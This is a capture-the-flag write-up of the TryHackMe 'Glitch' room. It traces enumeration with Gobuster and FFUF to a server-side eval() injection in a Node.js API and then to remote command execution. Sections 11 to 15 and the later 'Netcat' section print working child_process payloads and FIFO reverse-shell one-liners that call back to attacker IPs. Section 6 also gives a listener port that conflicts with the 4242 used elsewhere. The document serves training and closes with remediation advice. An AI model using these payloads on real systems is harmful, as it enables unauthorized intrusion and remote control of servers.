# TryHackMe Glitch — API Fuzzing, RCE & Reverse Shell Write-Up

> **Spoiler warning:** This write-up documents the attack path for the TryHackMe **Glitch** room.

**Room:** Glitch  
**Platform:** TryHackMe  
**Focus:** Web Enumeration, API Discovery, Parameter Fuzzing, Server-Side JavaScript Injection, RCE  
**Attacker:** Kali/Fedora host connected through TryHackMe VPN  
**Attack Path:** Web Enumeration → Hidden Route Discovery → API Mapping → Method Enumeration → Parameter Fuzzing → `eval()` Discovery → RCE → Reverse Shell

> TryHackMe target and VPN IP addresses are temporary and may change between sessions.

---

## 1. Web Directory Enumeration

The target web application was enumerated with Gobuster.

```bash
gobuster dir -u http://10.48.161.197 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Output

```text
img                  (Status: 301) [Size: 173] [--> /img/]
js                   (Status: 301) [Size: 171] [--> /js/]
secret               (Status: 200) [Size: 724]
Secret               (Status: 200) [Size: 724]
```

### Finding

The important accessible route was:

```text
/secret
```

A `200 OK` response confirmed direct access.

---

## 2. Inspecting `/secret`

The page source was retrieved with:

```bash
curl -s http://10.48.161.197/secret
```

### Relevant JavaScript

```javascript
function getAccess() {
  fetch('/api/access')
    .then((response) => response.json())
    .then((response) => {
      console.log(response);
    });
}
```

### Finding

The frontend disclosed a hidden API endpoint:

```text
/api/access
```

This route was discovered through JavaScript analysis rather than wordlist enumeration.

---

## 3. API Access Endpoint

The endpoint was queried directly:

```bash
curl -s http://10.48.161.197/api/access
```

### Response

```json
{"token":"dGhpc19pc19ub3RfcmVhbA=="}
```

The value appeared to be Base64.

```bash
echo 'dGhpc19pc19ub3RfcmVhbA==' | base64 -d
```

### Decoded Value

```text
this_is_not_real
```

The returned token was a decoy.

---

## 4. HTTP Header Inspection

The full response was inspected with:

```bash
curl -i http://10.48.161.197/api/access
```

### Relevant Headers

```text
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Content-Type: application/json; charset=utf-8
X-Powered-By: Express
```

### Technology Stack

```text
Nginx
  ↓
Node.js / Express
```

The `X-Powered-By: Express` header identified the backend framework.

---

## 5. API Route Enumeration

Gobuster was used against the `/api` path.

```bash
gobuster dir -u http://10.48.161.197/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Output

```text
access               (Status: 200) [Size: 36]
items                (Status: 200) [Size: 169]
Access               (Status: 200) [Size: 36]
Items                (Status: 200) [Size: 169]
```

### New Endpoint

```text
/api/items
```

---

## 6. Inspecting `/api/items`

The JSON response was formatted with `jq`.

```bash
curl -s http://10.48.161.197/api/items | jq
```

### Response

```json
{
  "sins": [
    "lust",
    "gluttony",
    "greed",
    "sloth",
    "wrath",
    "envy",
    "pride"
  ],
  "errors": [
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error",
    "error"
  ],
  "deaths": [
    "death"
  ]
}
```

Testing these values as direct API routes returned `404 Not Found`.

Example:

```bash
curl -i http://10.48.161.197/api/lust
```

The values were not direct routes.

---

## 7. HTTP Method Enumeration

The supported methods for `/api/items` were checked with `OPTIONS`.

```bash
curl -i -X OPTIONS http://10.48.161.197/api/items
```

### Response

```text
HTTP/1.1 200 OK
Allow: GET,HEAD,POST

GET,HEAD,POST
```

### Finding

The route exposed a `POST` handler.

---

## 8. Testing the POST Handler

A POST request without a body was sent:

```bash
curl -i -X POST http://10.48.161.197/api/items
```

### Response

```json
{"message":"there_is_a_glitch_in_the_matrix"}
```

Status:

```text
400 Bad Request
```

An empty JSON body produced the same result:

```bash
curl -i -X POST http://10.48.161.197/api/items \
-H "Content-Type: application/json" \
-d '{}'
```

Several guessed JSON fields were tested.

```bash
for body in '{"item":"lust"}' '{"sin":"lust"}' '{"sins":"lust"}' '{"error":"error"}' '{"errors":"error"}' '{"death":"death"}' '{"deaths":"death"}' '{"token":"this_is_not_real"}'; do
  echo "===== $body ====="
  curl -s -w '\nSTATUS:%{http_code} SIZE:%{size_download}\n' \
  -X POST http://10.48.161.197/api/items \
  -H "Content-Type: application/json" \
  -d "$body"
done
```

### Result

Every request returned:

```text
STATUS:400 SIZE:45
```

with:

```json
{"message":"there_is_a_glitch_in_the_matrix"}
```

### Conclusion

The POST handler was not expecting the guessed JSON fields.

The next step was query-parameter fuzzing.

---

## 9. POST Query Parameter Fuzzing

FFUF was used to discover accepted query parameter names.

```bash
ffuf -w /usr/share/dirb/wordlists/big.txt \
-X POST \
-u 'http://10.48.161.197/api/items?FUZZ=id' \
-fc 400
```

### Relevant Result

```text
cmd    [Status: 500, Size: 1079, Words: 55, Lines: 11]
```

### Finding

The parameter:

```text
cmd
```

produced a different server response.

The normal baseline was:

```text
400 Bad Request
```

The `cmd` parameter produced:

```text
500 Internal Server Error
```

This response difference identified an input handled differently by the backend.

---

## 10. Triggering the `cmd` Parameter

The parameter was tested with:

```bash
curl -i -X POST 'http://10.48.161.197/api/items?cmd=id'
```

### Response

```text
ReferenceError: id is not defined
    at eval (eval at router.post (/var/web/routes/api.js:25:60), <anonymous>:1:1)
    at router.post (/var/web/routes/api.js:25:60)
```

### Critical Finding

The backend stack trace disclosed:

```text
eval
```

and:

```text
/var/web/routes/api.js:25:60
```

The backend was evaluating attacker-controlled input.

Conceptually:

```javascript
eval(req.query.cmd)
```

The string:

```text
id
```

was interpreted as JavaScript, not as a Linux command.

Because no JavaScript variable named `id` existed, the backend returned:

```text
ReferenceError: id is not defined
```

### Vulnerability

```text
User-controlled cmd parameter
        ↓
Server-side eval()
        ↓
JavaScript code injection
        ↓
Potential OS command execution
```

---

## 11. Escalating JavaScript Injection to RCE

Because the application was running Node.js, the `child_process` module could be used to execute operating-system commands.

The vulnerable expression follows this structure:

```javascript
require("child_process").exec("COMMAND")
```

A harmless OS command can be used to confirm command execution:

```javascript
require("child_process").exec("id")
```

The main security issue is the direct evaluation of attacker-controlled JavaScript.

---

## 12. Burp Suite Repeater

The vulnerable request was moved into Burp Suite Repeater for manual payload testing.

The route structure was:

```http
POST /api/items?cmd=<PAYLOAD> HTTP/1.1
Host: <TARGET_IP>
```

Burp Repeater was used to:

- Modify the `cmd` parameter.
- URL-encode the payload.
- Send repeated requests.
- Compare response behavior.

For URL encoding in Burp:

```text
Select payload → Ctrl + U
```

The `Host` header must contain the vulnerable target IP.

Example:

```http
Host: 10.48.145.7
```

The callback IP inside a reverse-shell payload must instead point to the attacker's TryHackMe VPN interface.

---

## 13. Identifying the VPN Callback IP

The attacker VPN IP was checked with:

```bash
ip -br addr show tun0
```

### Output

```text
tun0             UP             192.168.187.114/18 fe80::4026:81d1:1e3e:d714/64
```

### Callback IP

```text
192.168.187.114
```

The network flow is:

```text
HTTP exploit request
Attacker → Target

Reverse shell callback
Target → 192.168.187.114:4242
```

A previous mistake used the target IP as the callback address.

That caused the target to attempt to connect back to itself.

---

## 14. Netcat Listener

A listener was started on port `4242`.

```bash
ncat -lvnp 4242
```

### Listener Output

```text
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
```

The listener was ready to accept the reverse connection.

---

## 15. Reverse Shell Payload in Burp

The reverse shell used a FIFO-based shell because Netcat `-e` support cannot be assumed.

Underlying shell command:

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.187.114 4242 >/tmp/f
```

Embedded into Node.js:

```javascript
require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.187.114 4242 >/tmp/f')
```

The payload was URL-encoded before being sent through the `cmd` query parameter.

Request structure:

```http
POST /api/items?cmd=<URL_ENCODED_NODEJS_PAYLOAD> HTTP/1.1
Host: 10.48.145.7
Connection: close
```

The Burp response returned:

```text
HTTP/1.1 200 OK
```

with:

```text
vulnerability_exploited [object Object]
```

### Important Note

A `200 OK` response only confirmed that the vulnerable application accepted and processed the expression.

It did not guarantee that the reverse connection succeeded.

The reverse shell depended on:

```text
Correct target IP
Correct tun0 callback IP
Matching listener port
Listener running before payload execution
Target outbound connectivity
Required shell utilities existing on the target
```

---

## Attack Chain

```text
Gobuster
   ↓
/secret discovered
   ↓
HTML / JavaScript inspection
   ↓
/api/access disclosed
   ↓
Base64 decoy token
   ↓
/api route enumeration
   ↓
/api/items discovered
   ↓
OPTIONS reveals POST
   ↓
JSON input testing
   ↓
No response difference
   ↓
FFUF query parameter fuzzing
   ↓
cmd parameter discovered
   ↓
500 response and stack trace
   ↓
Server-side eval() disclosed
   ↓
JavaScript injection
   ↓
Node.js child_process
   ↓
OS command execution
   ↓
Burp Repeater payload delivery
   ↓
Netcat listener on tun0 callback IP
   ↓
Reverse shell stage
```

---

## Key Commands

### Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Inspect Hidden Page

```bash
curl -s http://<TARGET_IP>/secret
```

### Query API

```bash
curl -s http://<TARGET_IP>/api/access
curl -s http://<TARGET_IP>/api/items | jq
```

### Method Enumeration

```bash
curl -i -X OPTIONS http://<TARGET_IP>/api/items
```

### Parameter Fuzzing

```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -X POST -u 'http://<TARGET_IP>/api/items?FUZZ=id' -fc 400
```

### Trigger `cmd`

```bash
curl -i -X POST 'http://<TARGET_IP>/api/items?cmd=id'
```

### Find TryHackMe VPN IP

```bash
ip -br addr show tun0
```

### Start Listener

```bash
ncat -lvnp 4242
```

---

## Security Findings

### 1. Exposed Development Route

The `/secret` page exposed internal JavaScript containing a hidden API route.

**Remediation**

- Remove unused development routes.
- Avoid exposing internal API references unnecessarily.
- Review client-side JavaScript for sensitive implementation details.

---

### 2. Technology Disclosure

The application disclosed:

```text
X-Powered-By: Express
```

**Remediation**

Disable the Express header:

```javascript
app.disable('x-powered-by')
```

---

### 3. Verbose Error and Stack Trace Disclosure

The application returned internal paths and source locations:

```text
/var/web/routes/api.js:25:60
```

**Remediation**

- Disable detailed production stack traces.
- Use centralized error handling.
- Return generic error responses to clients.

---

### 4. Unsafe Use of `eval()`

The application evaluated attacker-controlled query input.

```text
cmd
  ↓
eval()
```

This allowed server-side JavaScript injection.

**Remediation**

Never pass user-controlled data to:

```javascript
eval()
```

Use strict allowlists and explicit application logic.

---

### 5. Remote Command Execution

The Node.js runtime exposed access to:

```javascript
require('child_process')
```

Once JavaScript injection was achieved, operating-system command execution became possible.

**Remediation**

- Remove unsafe dynamic code evaluation.
- Run the application with minimal operating-system privileges.
- Apply process isolation and container hardening.
- Restrict outbound network access where appropriate.

---

#### 6. Netcat Running on Port 4561 
In burp suite repeater captured log from /api/items?cmd=whoami with token auth (this_is_not_real)
modified it for reverse shell.

```nodejs
require('child_process').exec('nc -e sh 10.10.10.10 9001')
```
```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
```
```finally
/api/items?cmd=require('child_process').exec('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+192.168.***.***+4242+>/tmp/f')
```

***note***
here i used my kali ip in which nc is live at port 4561.
once after this you get the shell access 

---

## Lessons Learned

1. Inspect HTML and JavaScript before relying only on wordlist fuzzing.
2. API attack-surface mapping includes routes, HTTP methods, parameters, and input formats.
3. `OPTIONS` can expose supported HTTP methods.
4. Response differences are valuable during fuzzing.
5. Filtering the normal baseline makes FFUF findings easier to identify.
6. A verbose stack trace can reveal the exact vulnerable function.
7. `eval()` on user-controlled input is a critical server-side code-injection flaw.
8. Node.js `child_process` can turn JavaScript injection into OS command execution.
9. The HTTP target IP and reverse-shell callback IP serve different purposes.
10. A `200 OK` exploit response does not automatically mean a reverse shell connected.

---

## Current Status

```text
Hidden route discovered:      /secret
API endpoints discovered:     /api/access, /api/items
POST parameter discovered:    cmd
Vulnerable function:          eval()
Backend:                      Node.js / Express
RCE primitive:                child_process
Listener:                     Ncat on port 4242
Callback interface:           tun0
Callback IP used:             192.168.187.114
Current stage:                Burp payload delivery / reverse shell
```

---

> This write-up documents an authorized TryHackMe training environment. Use these techniques only on systems you own or are explicitly authorized to test.
